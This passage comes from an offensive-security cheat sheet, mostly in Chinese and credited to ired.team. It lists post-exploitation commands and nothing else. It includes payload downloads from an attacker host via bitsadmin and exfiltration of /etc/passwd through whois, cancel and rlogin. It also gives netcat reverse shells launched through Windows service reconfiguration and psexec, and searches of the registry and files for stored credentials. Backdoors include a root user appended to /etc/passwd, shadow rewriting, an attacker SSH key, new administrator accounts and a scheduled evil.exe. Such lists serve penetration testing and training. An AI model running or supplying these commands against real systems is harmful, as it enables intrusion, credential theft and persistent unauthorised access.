    nc $ATTACKER 4444 > file.exe
### HTTP: Windows "debug.exe" Method
    # 1. In Linux, convert binary to hex ascii:
    wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
    # 2. Paste nc.txt into Windows Shell.
### HTTP: Windows BitsAdmin
    cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
### HTTP: Windows BitsAdmin
    cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
### Whois Data Exfiltration
    # attacker
    nc -l -v -p 43 | sed "s/ //g" | base64 -d
    # victim
    whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
### Cancel 数据泄露
    cancel -u "$(cat /etc/passwd)" -h ip:port
### rlogin数据泄露
    rlogin -l "$(cat /etc/passwd)" -p port host
### 指定范围ping
    #!/bin/bash
    for lastOctet in {1..254}; do 
        ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
    done
### 爆破XOR
    encrypted = "encrypted-string-here"
    for i in range(0,255):
        print("".join([chr(ord(e) ^ i) for e in encrypted]))
### 生成错误字符
    # Python
    '\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
    # Bash
    for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
### .py -> .exe
    python pyinstaller.py --onefile convert-to-exe.py
### Netcat Portscan
    nc -nvv -w 1 -z host 1000-2000
    nc -nv -u -z -w 1 host 160-162
### 渗透Windows 服务
    # Look for SERVICE_ALL_ACCESS in the output
    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
    sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
    sc qc [service_name] (to verify!)
    sc start [service_name]
### 查找为指定用户显式设置的文件/文件夹权限
    icacls.exe C:\folder /findsid userName-or-*sid /t
    //look for (F)ull, (M)odify, (W)rite
### AlwaysInstallElevated MSI
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>
> AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的MSI文件就可以进行管理员权限的提升
[Metasploit PowershellAlwaysInstallElevated提权实战](https://xz.aliyun.com/t/203)
### Windows凭证
    c:\unattend.xml
    c:\sysprep.inf
    c:\sysprep\sysprep.xml
    dir c:\*vnc.ini /s /b
    dir c:\*ultravnc.ini /s /b 
    dir c:\ /s /b | findstr /si *vnc.ini
    findstr /si password *.txt | *.xml | *.ini
    findstr /si pass *.txt | *.xml | *.ini
    dir /s *cred* == *pass* == *.conf
    # Windows Autologon
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    # VNC
    reg query "HKCU\Software\ORL\WinVNC3\Password"
    # Putty
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    # Registry
    reg query HKLM /f password /t REG_SZ /s 
    reg query HKCU /f password /t REG_SZ /s
### 没带引号的服务路径
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
    wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
### 服务后门
    sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
### Port Forwarding / SSH Tunneling
#### SSH: Local Port Forwarding
    # Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
    # Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
    ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
#### SSH动态端口转发
    # Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
    # Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
    ssh -D 127.0.0.1:8080 user@SSH_SERVER
#### SSH远程端口转发
    # Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
    # Scenario: expose RDP on non-routable network;
    ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
    plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
#### 代理隧道
    # Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
    # Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
    proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
    ssh user@127.0.0.1 -p 5555
#### http隧道
    # Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
    hts -F localhost:22 80
    # Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
    htc -F 8080 192.168.1.15:80
    # Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
    ssh localhost -p 8080
### Netsh转发
    # requires admin
    netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
### RunAs
> runas是Microsoft
> Windows系列操作系统中的一个命令，允许用户以不同的用户名运行特定的工具和程序，以用于以交互方式登录计算机的用户名。它类似于Unix命令sudo和su，但Unix命令通常需要系统管理员事先配置才能为特定用户和/或命令工作。
#### powershell
    # Requires PSRemoting
    $username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }
    # without PSRemoting
    cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))
    # without PS Remoting, with arguments
    cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
#### CMD
    # Requires interactive console
    runas /user:userName cmd.exe
#### PsExec
    psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
#### Pth-WinExe
    pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
### 发现隐藏文件
    dir /A:H /s "c:\program files"
### 常规的文件搜索操作
    # Query the local db for a quick file find. Run updatedb before executing locate.
    locate passwd 
    # Show which file would be executed in the current environment, depending on $PATH environment variable;
    which nc wget curl php perl python netcat tftp telnet ftp
    # Search for *.conf (case-insensitive) files recursively starting with /etc;
    find /etc -iname *.conf
## 后渗透
### 注册表配置单元
    hivesh /registry/file
[hivexsh - Windows注册表配置单元shell](http://libguestfs.org/hivexsh.1.html)
### 解密VNC的密码
    wine vncpwdump.exe -k key
### 创建用户并添加到管理员组
    net user wing wing /add & net localgroup Administrators spotless /add
Wingtips：在无回显的时候，添加失败可能是因为你的密码强度不符合密码策略。
### SSH keys
    mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
### Creating Backdoor
    echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
    # Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
    sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
### 另外创建一个root用户
    useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
### OpenSSL Password
    openssl passwd -1 password 
    # output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
### 定时任务
    # Launch evil.exe every 10 minutes
    schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
[原文链接](https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#working-with-restricted-shells)